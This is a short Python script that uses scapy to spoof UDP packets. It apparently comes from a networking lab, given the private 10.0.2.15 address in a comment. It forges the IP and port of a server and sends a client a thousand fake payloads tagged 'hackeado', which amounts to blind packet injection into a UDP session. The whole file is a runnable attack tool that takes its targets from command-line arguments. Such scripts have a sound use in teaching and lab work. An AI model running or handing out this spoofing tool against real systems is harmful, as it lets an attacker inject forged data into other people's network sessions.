#!/usr/bin/python3
import sys # ('10.0.2.15', 53688)
from scapy.all import UDP, IP, Raw, send
import random

def inject_pirate_packets(server_ip, server_port, client_ip, client_port):
    print(f"Pirate is attacking! Sending packets to {client_ip}:{client_port} pretending to be {server_ip}:{server_port}")

    # Blindly craft packets with a range of potential payloads or sequence numbers
    for seq_num in range(100, 1100):  # You can adjust the range as needed
        # Create a fake payload, inserting the "hackeado" string
        fake_payload = f"hackeado_seq_{seq_num}".encode()

        # Build the forged packet
        pirate_packet = IP(src=server_ip, dst=client_ip) / UDP(sport=server_port, dport=client_port) / Raw(load=fake_payload)

        # Send the forged packet
        print(f"Injecting fake packet with sequence number {seq_num}")
        send(pirate_packet, verbose=0)

    print("Attack completed!")


if len(sys.argv) != 5:
    print("Usage: ./pirate.py <server_ip> <server_port> <client_ip> <client_port>")
    sys.exit(1)

server_ip = sys.argv[1]
server_port = int(sys.argv[2])
client_ip = sys.argv[3]
client_port = int(sys.argv[4])

inject_pirate_packets(server_ip, server_port, client_ip, client_port)